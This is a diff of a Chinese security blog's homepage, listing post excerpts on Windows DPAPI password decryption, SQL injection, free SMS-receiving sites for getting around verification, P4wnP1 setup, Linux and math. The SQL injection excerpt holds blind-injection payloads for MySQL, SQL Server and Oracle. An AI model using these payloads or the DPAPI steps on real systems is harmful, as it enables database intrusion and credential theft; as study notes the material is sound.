@@ -48,7 +48,7 @@
   isHome: true,
   isHighlightShrink: false,
   isToc: false,
-  postUpdate: '2023-09-27 18:02:34'
+  postUpdate: '2023-09-28 16:33:32'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -146,50 +146,63 @@
 
 学！后续会持续更新
 
-系统密码DPAPI解密使用用户登录密码解密Master Key file，获得Master Key
+系统密码
+DPAPI解密
+使用用户登录密码解密Master Key file，获得Master Key
 固定位置： %APPDATA%\Microsoft\Protect\%SID%下往往有多个Master Key file
 这是为了安全起见，系统每隔90天会自动生成一个新的Master Key(旧的不会删除)
 %APPDATA%\Microsoft\Protect\%SID%下存在一个固定文件Preferred，包含最后一个Master Key file的名称和创建时间，文件结构如下：
 typedef struct _tagPreferredMasterKey&#123;  GUID guidMasterKey;  FILETIME ftCreated;&#125; PREFERREDMASTERKEY, *PPREFERREDMASTERKEY;
 完整的流程：
 
-找到本机的Master Key f ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/07/21/DatabaseHub/" title="数据库利用汇总"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/108.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="数据库利用汇总"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/21/DatabaseHub/" title="数据库利用汇总">数据库利用汇总</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta-separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-21T13:45:42.000Z" title="发表于 2020-07-21 21:45:42">2020-07-21</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.872Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+找到本机的Master Key ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/07/21/DatabaseHub/" title="数据库利用汇总"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/108.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="数据库利用汇总"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/21/DatabaseHub/" title="数据库利用汇总">数据库利用汇总</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta-separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-21T13:45:42.000Z" title="发表于 2020-07-21 21:45:42">2020-07-21</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.872Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
 前言
 
 找笔记是在太烦人了，干脆全部写在一篇里面（来自1年半后的从写
 
-随手测试语句语句前面适当加入&#39; 、&quot;、and等参数
-#算个MD5extractvalue(1,concat(char(126),md5(1941797210)))#MySQL常用的盲注语句(CASE/**/WHEN/**/(2382=2382)/**/THEN/**/SLEEP(5)/**/ELSE/**/2382/**/END)    (select*from(select+sleep(4)union/**/select+1)a)#SQL Server常用的盲注语句/**/and(select+1)&gt;0waitfor/**/delay&#x27;0:0:4&#x27;/**/#Oracle常用的盲注语句/**/and/**/3=DBMS_PIPE.RECEIVE_MESSAGE(&#x27;n&#x27;,2)#PostgreSQ ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2019/09/05/KnowledgeNavigationFile/" title="杂项知识汇总"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/43.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="杂项知识汇总"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/09/05/KnowledgeNavigationFile/" title="杂项知识汇总">杂项知识汇总</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta-separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-09-05T13:45:42.000Z" title="发表于 2019-09-05 21:45:42">2019-09-05</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.632Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/XSS/">XSS</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+随手测试语句
+语句前面适当加入' 、&quot;、and等参数
+#算个MD5extractvalue(1,concat(char(126),md5(1941797210)))#MySQL常用的盲注语句(CASE/**/WHEN/**/(2382=2382)/**/THEN/**/SLEEP(5)/**/ELSE/**/2382/**/END)    (select*from(select+sleep(4)union/**/select+1)a)#SQL Server常用的盲注语句/**/and(select+1)&gt;0waitfor/**/delay&#x27;0:0:4&#x27;/**/#Oracle常用的盲注语句/**/and/**/3=DBMS_PIPE.RECEIVE_MESSAGE(&#x27;n&#x27;,2)#PostgreSQL常用 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2019/09/05/KnowledgeNavigationFile/" title="杂项知识汇总"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/43.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="杂项知识汇总"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/09/05/KnowledgeNavigationFile/" title="杂项知识汇总">杂项知识汇总</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta-separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-09-05T13:45:42.000Z" title="发表于 2019-09-05 21:45:42">2019-09-05</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.632Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/XSS/">XSS</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
-验证码相关手机短信接码
+验证码相关
+手机短信接码
+
+
 国内平台
 https://www.pdflibr.comhttps://www.visitorsms.com/cnhttps://www.becmd.comhttp://www.114sim.comhttps://yunduanxin.nethttp://www.smszk.comhttp://z-sms.comhttp://www.shejiinn.comhttps://sms.cngrok.com
 
+
 国外平台
-https://ch.freephonenum.comhttps://smsreceivefree.comhttps://zh.mytrashmobile.comhttps://www.receive-sms-online.infohttps://receiveasms.comhttps://sms-online.co/receive-free-smshttps://receive-sms.co ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2019/08/12/LinuxStudyNotes/" title="Linux学习笔记"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/34.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux学习笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/08/12/LinuxStudyNotes/" title="Linux学习笔记">Linux学习笔记</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta-separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-08-12T15:58:53.000Z" title="发表于 2019-08-12 23:58:53">2019-08-12</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+https://ch.freephonenum.comhttps://smsreceivefree.comhttps://zh.mytrashmobile.comhttps://www.receive-sms-online.infohttps://receiveasms.comhttps://sms-online.co/receive-free-smshttps://receive-sm ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2019/08/12/LinuxStudyNotes/" title="Linux学习笔记"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/34.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux学习笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/08/12/LinuxStudyNotes/" title="Linux学习笔记">Linux学习笔记</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta-separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-08-12T15:58:53.000Z" title="发表于 2019-08-12 23:58:53">2019-08-12</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 于2020/3/18日重新排版修改
 根目录解析
+
+
 / - 根目录
 每一个文件和目录都从这里开始。
 只有root用户具有该目录下的写权限。此目录和/root目录不同，/root目录是root用户的主目录。
+
 
 /bin - 用户二进制文件
 包含二进制可执行文件。
 系统的所有用户使用的命令都设在这里，例如：ps，ls，ping，grep，cp等。
 
+
 /sbin - 系统二进制文件
 就像/bin，/sbin同样也包含二进制可执行文件。
 但是，在这个目录下的linux命令通常由系统管理员使用，对系统进行维护。例如：iptables、reboot、fdisk、ifconfig、swapon命令。
+
 
 /etc - 配置文件
 包含所有程序所需的配置文件。
 也包含了用于启动/停止单个程序的启动和关闭shell脚本。例如：/etc/resolv.conf、/etc/logrotate.conf
 
+
 /dev - 设备文件
-这些包括终端设备、USB或连接 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2019/06/29/raspberry/" title="P4wnP1全家桶安装及实战"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/35.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="P4wnP1全家桶安装及实战"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/06/29/raspberry/" title="P4wnP1全家桶安装及实战">P4wnP1全家桶安装及实战</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta-separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-06-29T02:57:46.000Z" title="发表于 2019-06-29 10:57:46">2019-06-29</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/">树莓派</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%9B%91%E5%90%AC/">监听</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/P4wnP1/">P4wnP1</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+这些包括终端设备、 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2019/06/29/raspberry/" title="P4wnP1全家桶安装及实战"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/35.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="P4wnP1全家桶安装及实战"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/06/29/raspberry/" title="P4wnP1全家桶安装及实战">P4wnP1全家桶安装及实战</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta-separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-06-29T02:57:46.000Z" title="发表于 2019-06-29 10:57:46">2019-06-29</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/">树莓派</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%9B%91%E5%90%AC/">监听</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/P4wnP1/">P4wnP1</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
 前言
@@ -201,13 +214,18 @@ https://ch.freephonenum.comhttps://smsreceivefree.comhttps://zh.mytrashmobile.co
 写在前头血的教训
 
 
+
 树莓派没有那么容易坏不用买第二个！！
+
 
 网上的wpa_supplicant.conf开启WIFI我试了N次都没成功过
 
+
 USB转接头一定要买不需要焊接(别买Zero Quick Plug Bad USB
 
+
 树莓派Zero W自带WIFI所以别再买WIFI模块了
+
 
 装完P4wnP1切记重启不要直接拔掉会导致开不了机
 sudo shutdown -r now
@@ -227,108 +245,143 @@ TF卡一张
 通过网线连接树莓派
 
 
+
 首先在config.txt最末行处换行添加如下代码，打开usb网卡模式
 dtoverlay=dwc2
 
-其次在cmdline.txt文件中找到rootwait字段，并在其后面空格添加如下信息，在打开系统时开启usb网卡模式 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2018/12/05/HardwareRelatedKnowledge/" title="硬件相关知识"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/39.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="硬件相关知识"></a></div><div class="recent-post-info"><a class="article-title" href="/2018/12/05/HardwareRelatedKnowledge/" title="硬件相关知识">硬件相关知识</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta-separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2018-12-05T12:02:59.000Z" title="发表于 2018-12-05 20:02:59">2018-12-05</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.849Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E7%A1%AC%E4%BB%B6/">硬件</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A0%86/">堆</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%A0%88/">栈</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84/">内存结构</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+
+其次在cmdline.txt文件中找到rootwait字段，并在其后面空格添加如下信息，在打开系统时开启 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2018/12/05/HardwareRelatedKnowledge/" title="硬件相关知识"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/39.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="硬件相关知识"></a></div><div class="recent-post-info"><a class="article-title" href="/2018/12/05/HardwareRelatedKnowledge/" title="硬件相关知识">硬件相关知识</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta-separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2018-12-05T12:02:59.000Z" title="发表于 2018-12-05 20:02:59">2018-12-05</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.849Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E7%A1%AC%E4%BB%B6/">硬件</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A0%86/">堆</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%A0%88/">栈</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84/">内存结构</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
 前言
 
 对两年前的知识进行了下温习，发现好多坑都填上了，然后把之前的文章删了总结到了一篇，到时候还有些点需要填上
-Windows/Linux的内存结构关于栈
+Windows/Linux的内存结构
+关于栈
+
 两个系统的内容都差不多可以参考这篇文章：Linux栈溢出总结0x00
 关于堆
+
 暂时未有，等写到的时候添加
 Windows的内存结构分布
+
 首先是内存结构分布图，windows的内存默认是从0x80000000位置开始的
 
 Linux的内存结构分布
+
 首先先放个内存结构图，linux内存默认是从0xC0000000位置开始的
-  
-Windows/Linux的汇编区别x86汇编一直存在两种不同的语法，在intel的官方文档中使用intel语法，Windows也使用intel语法，而UNIX平台的汇编器一直使用AT&amp;T语法。而linux是UNIX衍生的一种系统所有也是使用AT&amp;T语法。
+
+Windows/Linux的汇编区别
+x86汇编一直存在两种不同的语法，在intel的官方文档中使用intel语法，Windows也使用intel语法，而UNIX平台的汇编器一直使用AT&amp;T语法。而linux是UNIX衍生的一种系统所有也是使用AT&amp;T语法。
 相关区别：
 
-AT&amp;T使用 $ 表示立即操作数，而Intel的立即操作 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/09/25/LinearAlgebra_0x01/" title="向量与行列式"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/171.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="向量与行列式"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/09/25/LinearAlgebra_0x01/" title="向量与行列式">向量与行列式</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-25T15:58:53.000Z" title="发表于 2023-09-25 23:58:53">2023-09-25</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-27T09:53:06.426Z" title="更新于 2023-09-27 17:53:06">2023-09-27</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E7%BA%BF%E4%BB%A3/">线代</a></span></div><div class="content">
-向量向量的定义$n$个有序的数$a{1},a{2},\ldots,a{n}$所组成的数组称为$n$维向量，这$n$个数称为该向量的$n$个分量，第$i$个数$a{i}$称为第$i$个分量。$n$维向量可写成一行，也可写成一列。$n$也称为该向量的维数。分别称为行向量和列向量:
-
-$n$维列向量：
-$\left(\begin{array}{c}a{1}\a{2}\\vdots\a_{n}\end{array}\right)$
-
-$n$维行向量：
-$\left(a{1},a{2},\ldots,a{n}\right)\text{或}\left(\begin{array}{llll}a{1}&amp;a{2}&amp;\cdots&amp;a{n}\end{array}\right)$
+AT&amp;T使用 $ 表示立即操作数，而Intel的 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/09/25/LinearAlgebra_0x01/" title="向量与行列式"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/171.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="向量与行列式"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/09/25/LinearAlgebra_0x01/" title="向量与行列式">向量与行列式</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-25T15:58:53.000Z" title="发表于 2023-09-25 23:58:53">2023-09-25</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-27T09:53:06.426Z" title="更新于 2023-09-27 17:53:06">2023-09-27</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E7%BA%BF%E4%BB%A3/">线代</a></span></div><div class="content">
+向量
+向量的定义
+nnn个有序的数a1,a2,…,ana_{1},a_{2},\ldots,a_{n}a1​,a2​,…,an​所组成的数组称为nnn维向量，这nnn个数称为该向量的nnn个分量，第iii个数aia_{i}ai​称为第iii个分量。nnn维向量可写成一行，也可写成一列。nnn也称为该向量的维数。分别称为行向量和列向量:
 
 
-二维向量2维向量$\boldsymbol{u}=\left(\begin{array}{l}u{1}\u{2}\end{array}\right)$其实就是直角坐标系中的一个点；也可以认为它是原点指向$\left(\begin{array}{l}u{1}\u{2}\end{array}\right)$的 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/09/11/FurtherMathematics_0x11/" title="重积分"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/170.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="重积分"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/09/11/FurtherMathematics_0x11/" title="重积分">重积分</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-11T15:58:53.000Z" title="发表于 2023-09-11 23:58:53">2023-09-11</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-20T09:45:43.631Z" title="更新于 2023-09-20 17:45:43">2023-09-20</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
-二重积分概念与性质概念定义     设函数$z=f(x,y)$在有界闭区域$D$上有定义，将区域$D$任意分成$n$个小闭区域
-$\begin{align}\Delta\sigma{1},\Delta\sigma{2},\cdots,\Delta\sigma_{n}\end{align}$
-其中$\Delta\sigma{i}$表示第$i$个小区域，也表示它的面积。在每个$\Delta\sigma{i}$上任取一点$\left(\xi{i},\eta{i}\right)$，作乘积$f\left(\xi{i},\eta{i}\right)\Delta\sigma{i}$，并求和$\sum{i=1}^{n}f\left(\xi{i},\eta{i}\right)\Delta\sigma{i}$，记$\lambda$为$n$个小区域$\Delta\sigma{1},\Delta\sigma{2},\cdots,\Delta\sigma{n}$中的最大直径，如果$\lim{\lambda\rightarrow0}\sum{i=1}^{n}f\left(\xi{i},\eta{i}\right ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/07/25/FurtherMathematics_0x10/" title="方向导数、梯度与多元函数的极致与最值"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/169.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="方向导数、梯度与多元函数的极致与最值"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/07/25/FurtherMathematics_0x10/" title="方向导数、梯度与多元函数的极致与最值">方向导数、梯度与多元函数的极致与最值</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-25T15:58:53.000Z" title="发表于 2023-07-25 23:58:53">2023-07-25</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-12T05:17:53.642Z" title="更新于 2023-09-12 13:17:53">2023-09-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%AB%98%E6%95%B0/">高数</a></span></div><div class="content">
-前置知识偏导数函数沿坐标轴方向的变化率
-$\begin{align}f{x}\left(x{0}, y{0}\right) &amp; = \lim {\Delta x \rightarrow 0} \frac{f\left(x{0}+\Delta x, y{0}\right)-f\left(x{0}, y{0}\right)}{\Delta x} \f{y}\left(x{0}, y{0}\right) &amp; = \lim {\Delta y \rightarrow 0} \frac{f\left(x{0}, y{0}+\Delta y\right)-f\left(x{0}, y{0}\right)}{\Delta y}\end{align}$
-方向余弦$\vec{l}=(a, b)$
+nnn维列向量：
+(a1a2⋮an)\left(\begin{array}{c}a_{1}\\a_{2}\\\vdots\\a_{n}\end{array}\right)⎝⎜⎜⎜⎜⎛​a1​a2​⋮an​​⎠⎟⎟⎟⎟⎞​
+
+
+nnn维行向量：
+(a1,a2,…,an)或(a1a2⋯an)\left(a_{1},a_{2},\ldots,a_{n}\right)\text{或}\left(\begin{array}{llll}a_{1}&amp;a_{2}&amp;\cdots&amp;a_{n}\end{array}\right)(a1​,a2​,…,an​)或(a1​​a2​​⋯​an​​)
+
+
+二维向量
+2维向量u=(u1u2)\boldsym ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/09/11/FurtherMathematics_0x11/" title="重积分"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/170.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="重积分"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/09/11/FurtherMathematics_0x11/" title="重积分">重积分</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-11T15:58:53.000Z" title="发表于 2023-09-11 23:58:53">2023-09-11</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-20T09:45:43.631Z" title="更新于 2023-09-20 17:45:43">2023-09-20</time></span><span 